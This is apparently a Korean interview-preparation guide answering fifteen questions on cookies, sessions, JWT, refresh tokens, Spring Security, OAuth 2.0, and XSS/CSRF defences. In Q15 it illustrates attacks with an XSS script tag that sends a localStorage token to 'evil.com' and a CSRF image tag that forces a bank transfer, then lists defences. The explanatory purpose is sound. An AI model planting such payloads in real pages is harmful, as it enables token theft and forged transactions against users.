# Cookie/Session/JWT 면접 질문 + 답변

---

## 기본 개념 (1~5)

### Q1. HTTP가 Stateless하다는 것은 무슨 뜻이고, 왜 상태 유지가 필요한가요?

> HTTP는 각 요청이 독립적이어서 서버가 이전 요청을 기억하지 못합니다.
> 첫 번째 요청에서 로그인해도, 두 번째 요청에서 서버는 "누구세요?"라고 합니다.
>
> 하지만 실제 서비스에서는 로그인 상태 유지, 장바구니, 사용자 설정 등
> 여러 요청에 걸쳐 상태를 유지해야 합니다.
> 이 문제를 해결하기 위해 Cookie, Session, JWT 같은 방법이 등장했습니다.

---

### Q2. Cookie란 무엇이고, 어떻게 동작하나요?

> Cookie는 서버가 브라우저에 저장하라고 보내는 작은 데이터(key=value)입니다.
>
> 동작 원리:
> 1. 서버가 HTTP 응답에 `Set-Cookie: user=kim` 헤더를 담아 보냅니다
> 2. 브라우저가 이 Cookie를 저장합니다
> 3. 이후 같은 도메인으로 요청할 때마다 `Cookie: user=kim`을 자동으로 포함합니다
> 4. 서버가 Cookie를 읽어서 사용자를 식별합니다
>
> ```
> [클라이언트] → POST /login → [서버]
> [클라이언트] ← Set-Cookie: user=kim ← [서버]
> [클라이언트] → GET /profile (Cookie: user=kim) → [서버]
> ```

---

### Q3. Cookie의 HttpOnly, Secure, SameSite 속성은 각각 무엇을 방어하나요?

> **HttpOnly**: JavaScript에서 `document.cookie`로 접근하는 것을 차단합니다.
> XSS 공격으로 악성 스크립트가 실행되어도 Cookie를 탈취할 수 없습니다.
>
> **Secure**: HTTPS 연결에서만 Cookie를 전송합니다.
> 평문 HTTP에서는 Cookie가 전송되지 않아 네트워크 도청을 방지합니다.
>
> **SameSite**: 다른 사이트에서 발생한 요청에 Cookie 전송을 제한합니다.
> `Strict`는 완전 차단, `Lax`는 GET만 허용, `None`은 모두 허용합니다.
> CSRF 공격을 방어하는 핵심 속성입니다.

---

### Q4. Session이란 무엇이고, 어떻게 동작하나요?

> Session은 사용자 상태를 서버에 저장하고, 클라이언트에는 Session ID만 전달하는 방식입니다.
>
> 동작 원리:
> 1. 사용자가 로그인하면 서버가 Session 객체를 생성합니다 (예: `{ abc123: { user: "kim" } }`)
> 2. Session ID(`abc123`)를 `Set-Cookie: JSESSIONID=abc123`으로 클라이언트에 보냅니다
> 3. 클라이언트가 매 요청마다 Cookie에 Session ID를 보냅니다
> 4. 서버가 Session ID로 저장소를 조회하여 사용자 정보를 확인합니다
>
> Cookie에는 Session ID만 있고, 실제 데이터는 서버에 저장되므로 Cookie 단독 사용보다 안전합니다.

---

### Q5. JWT란 무엇이고, 구조를 설명해주세요.

> JWT(JSON Web Token)는 사용자 정보를 토큰 자체에 담아 발급하는 인증 방식입니다.
> 서버에 상태를 저장하지 않는 Stateless 방식입니다.
>
> 3개의 부분이 점(.)으로 구분됩니다:
>
> **Header**: 토큰 타입(JWT)과 서명 알고리즘(HS256 등)을 지정합니다.
>
> **Payload**: 실제 데이터(Claims)를 담습니다.
> 사용자 ID, 권한, 발급시간(iat), 만료시간(exp) 등이 포함됩니다.
>
> **Signature**: Header와 Payload를 비밀 키로 서명한 값입니다.
> 토큰이 위변조되었는지 검증하는 데 사용됩니다.
>
> ```
> eyJhbGciOiJIUz.eyJzdWIiOiIxMjM0.SflKxwRJSMeKKF
>     Header     .    Payload     .   Signature
> ```

---

## 비교/구분 (6~9)

### Q6. Cookie와 Session의 차이는 무엇인가요?

> | 비교 | Cookie | Session |
> |------|--------|---------|
> | 저장 위치 | 클라이언트(브라우저) | 서버(메모리/Redis) |
> | 보안 | 데이터 노출 가능 | 서버에 저장되어 안전 |
> | 용량 | 4KB 제한 | 서버 메모리만큼 |
> | 서버 부하 | 없음 | 사용자 수만큼 증가 |
>
> 핵심 차이는 **데이터의 저장 위치**입니다.
> Session도 Session ID를 Cookie로 전달하기 때문에 Cookie를 사용합니다.
> Cookie만 쓰면 데이터가 클라이언트에 노출되고, Session을 쓰면 서버에 안전하게 저장됩니다.
> 대신 Session은 서버 메모리를 사용하므로 사용자가 많으면 부하가 늘어납니다.

---

### Q7. Session 방식과 JWT 방식을 비교해주세요. 각각 언제 적합한가요?

> | 비교 | Session | JWT |
> |------|---------|-----|
> | 상태 | Stateful (서버 저장) | Stateless (토큰에 저장) |
> | 서버 확장 | 어려움 (공유 저장소 필요) | 쉬움 (서버 저장 불필요) |
> | 강제 로그아웃 | 쉬움 (Session 삭제) | 어려움 (만료까지 유효) |
> | 서버 부하 | Session 조회 비용 | 서명 검증만 (경량) |
>
> **Session이 적합한 경우**: 단일 서버 환경의 전통적인 웹 앱,
> 강제 로그아웃이 반드시 필요한 금융/보안 서비스.
>
> **JWT가 적합한 경우**: 마이크로서비스 아키텍처, 모바일 앱 API,
> 서버 확장이 빈번한 대규모 서비스.
>
> 실무에서는 JWT + Redis(Refresh Token 관리) 조합을 많이 사용합니다.

---

### Q8. JWT를 LocalStorage에 저장하는 것과 HttpOnly Cookie에 저장하는 것의 차이는 무엇인가요?

> **LocalStorage 저장**:
> - XSS에 취약합니다. 악성 스크립트가 `localStorage.getItem("token")`으로 토큰을 탈취할 수 있습니다.
> - CSRF에는 안전합니다. 브라우저가 자동으로 전송하지 않고, JavaScript로 명시적으로 헤더에 넣어야 합니다.
>
> **HttpOnly Cookie 저장**:
> - XSS에 안전합니다. JavaScript에서 Cookie에 접근할 수 없습니다.
> - CSRF에 취약할 수 있습니다. Cookie는 같은 도메인 요청 시 자동 전송되기 때문입니다.
> - `SameSite` 속성과 CSRF Token으로 방어해야 합니다.
>
> 보안 관점에서는 HttpOnly Cookie가 더 안전하지만, CSRF 방어를 추가로 구현해야 합니다.
> 소규모 프로젝트에서는 Access Token을 LocalStorage에, Refresh Token을 HttpOnly Cookie에 저장하기도 합니다.

---

### Q9. Access Token과 Refresh Token은 왜 분리하나요? 각각의 역할은 무엇인가요?

> **Access Token**: 실제 API 요청에 사용하며, 수명이 짧습니다(15분~1시간).
> 탈취되더라도 짧은 시간 내에 만료되어 피해를 줄입니다.
>
> **Refresh Token**: Access Token을 재발급받을 때 사용하며, 수명이 깁니다(7일~30일).
> 서버 DB에 저장하여 강제 무효화(로그아웃, 비밀번호 변경 시)가 가능합니다.
>
> 분리하는 이유:
> - JWT는 한 번 발급하면 서버에서 무효화하기 어렵습니다
> - Access Token의 수명을 짧게 하면 탈취 위험을 줄일 수 있습니다
> - Refresh Token을 서버에 저장하면 강제 만료가 가능합니다
> - 사용자는 Refresh Token 덕분에 자주 재로그인할 필요가 없습니다
>
> ```
> Access Token 만료 → Refresh Token으로 재발급 → 새 Access Token 사용
> ```

---

## 심화/실무 (10~12)

### Q10. 서버가 여러 대일 때 Session을 어떻게 관리하나요?

> 서버 A에서 생성한 Session을 서버 B는 알 수 없어 인증이 실패하는 문제가 발생합니다.
> 세 가지 해결 방법이 있습니다.
>
> **1. Sticky Session**: 로드밸런서가 같은 클라이언트를 항상 같은 서버로 보냅니다.
> 간단하지만 서버 장애 시 Session이 유실되고 부하 분산이 불균형해질 수 있습니다.
>
> **2. Session Clustering**: 서버 간 Session을 복제합니다.
> 어느 서버로 가도 동작하지만, 서버가 많아질수록 동기화 비용이 폭증합니다.
>
> **3. 외부 저장소 (Redis)**: 모든 서버가 Redis에서 Session을 조회합니다.
> 서버 수에 관계없이 동작하며, Spring Boot에서는 Spring Session + Redis로 쉽게 구현합니다.
>
> 실무에서는 3번(Redis)을 가장 많이 사용합니다.
> Redis 장애에 대비해 클러스터 구성이나 Sentinel을 적용합니다.

---

### Q11. Spring Security + JWT 인증 흐름을 설명해주세요.

> **로그인 시**:
> 1. 클라이언트가 `POST /auth/login`에 ID/PW를 보냅니다
> 2. AuthService가 사용자를 조회하고 비밀번호를 검증합니다 (BCrypt)
> 3. JwtTokenProvider가 Access Token + Refresh Token을 생성합니다
> 4. 토큰을 클라이언트에 반환합니다
>
> **API 요청 시**:
> 1. 클라이언트가 `Authorization: Bearer <token>` 헤더를 포함하여 요청합니다
> 2. JwtAuthenticationFilter(Spring Security 필터)가 헤더에서 토큰을 추출합니다
> 3. JwtTokenProvider로 Signature 검증과 만료 여부를 확인합니다
> 4. 검증 성공 시 SecurityContextHolder에 인증 정보를 저장합니다
> 5. Controller에서 `@AuthenticationPrincipal`로 사용자 정보에 접근합니다
>
> 핵심 구성 요소: `JwtTokenProvider`(토큰 생성/검증), `JwtAuthenticationFilter`(필터에서 검증),
> `SecurityConfig`(URL별 인증 규칙 설정)

---

### Q12. OAuth 2.0이란 무엇이고, 소셜 로그인은 어떤 흐름으로 동작하나요?

> OAuth 2.0은 제3자 서비스(Google, Kakao 등)를 통해 인증/인가하는 프로토콜입니다.
> 우리 서비스가 사용자의 비밀번호를 직접 관리하지 않고, 신뢰할 수 있는 서비스에 인증을 위임합니다.
>
> Authorization Code Grant 흐름:
> 1. 사용자가 "구글로 로그인" 클릭 → 구글 로그인 페이지로 redirect
> 2. 사용자가 구글에 로그인하고 권한 동의
> 3. 구글이 Authorization Code를 우리 서버 callback URL로 전달
> 4. 우리 서버가 code + client_secret으로 구글에 Access Token 요청
> 5. 구글이 Access Token 발급 → 우리 서버가 구글 API로 사용자 정보 조회
> 6. 우리 서비스에서 회원가입/로그인 처리 후 우리 서비스의 JWT를 발급
>
> 주의: OAuth의 Access Token은 구글 API 호출용이고, 우리 서비스의 JWT와는 별개입니다.

---

## 꼬리질문 대비 (13~15)

### Q13. JWT의 Payload는 암호화되어 있나요? 민감 정보를 넣어도 되나요?

> Payload는 암호화(encryption)가 아니라 **Base64 인코딩(encoding)**입니다.
> 누구나 디코딩하면 내용을 읽을 수 있습니다.
>
> ```
> eyJzdWIiOiIxMjM0IiwibmFtZSI6ImtpbSJ9
> → Base64 디코딩 → {"sub":"1234","name":"kim"}
> ```
>
> 따라서 비밀번호, 주민번호, 카드번호 같은 민감 정보는 절대 넣으면 안 됩니다.
> Payload에는 사용자 ID, 권한(role), 만료시간 같은 최소한의 식별 정보만 담아야 합니다.
>
> Signature는 위변조 방지를 위한 것이지, 데이터를 숨기기 위한 것이 아닙니다.
> 만약 Payload를 암호화해야 한다면 JWE(JSON Web Encryption)를 사용할 수 있습니다.

---

### Q14. JWT를 서버에서 강제로 만료시킬 수 있나요? 어떻게 해야 하나요?

> 기본적으로 JWT는 Stateless이므로 서버에서 강제 만료시킬 수 없습니다.
> 토큰이 유효한 한 만료시간까지 계속 사용 가능합니다.
>
> 강제 만료가 필요한 경우 다음 방법을 사용합니다:
>
> **1. Token Blacklist (블랙리스트)**:
> 무효화할 토큰의 ID(jti)를 Redis에 저장하고, 검증 시 블랙리스트를 확인합니다.
> 매 요청마다 Redis를 조회해야 하므로 Stateless의 장점이 약해집니다.
>
> **2. Refresh Token 무효화**:
> Refresh Token을 서버 DB에서 삭제하면, Access Token 만료 후 재발급이 불가합니다.
> Access Token의 수명을 짧게(15분) 설정하면 빠르게 효과가 나타납니다.
>
> **3. 비밀 키 변경**:
> 서명 키를 변경하면 기존 모든 토큰이 무효화됩니다.
> 단, 모든 사용자가 동시에 로그아웃되므로 최후의 수단입니다.
>
> 실무에서는 2번(Refresh Token 무효화 + 짧은 Access Token)을 가장 많이 사용합니다.

---

### Q15. XSS와 CSRF 공격의 차이는 무엇이고, 각각 어떻게 방어하나요?

> **XSS (Cross-Site Scripting)**:
> 공격자가 웹 페이지에 악성 스크립트를 삽입하여 실행시키는 공격입니다.
> 예: 게시판에 `<script>fetch('evil.com?token='+localStorage.token)</script>` 삽입
> → 다른 사용자가 게시글 열면 토큰이 탈취됩니다.
>
> XSS 방어:
> - 입력값 검증 및 이스케이핑 (HTML 태그 무력화)
> - `HttpOnly` Cookie 사용 (JavaScript에서 Cookie 접근 차단)
> - CSP(Content Security Policy) 헤더 설정
>
> **CSRF (Cross-Site Request Forgery)**:
> 사용자가 로그인된 상태에서, 다른 사이트가 사용자 모르게 요청을 보내는 공격입니다.
> 예: 악성 사이트에 `<img src="bank.com/transfer?to=hacker&amount=1000000">` 삽입
> → 사용자 브라우저가 Cookie를 자동으로 포함하여 송금 요청을 보냅니다.
>
> CSRF 방어:
> - `SameSite` Cookie 속성 설정 (다른 사이트 요청 시 Cookie 차단)
> - CSRF Token 사용 (서버가 발급한 토큰을 요청에 포함해야 처리)
> - Referer/Origin 헤더 검증
>
> 핵심 차이: XSS는 **스크립트 실행**이 문제이고, CSRF는 **인증된 요청 위조**가 문제입니다.
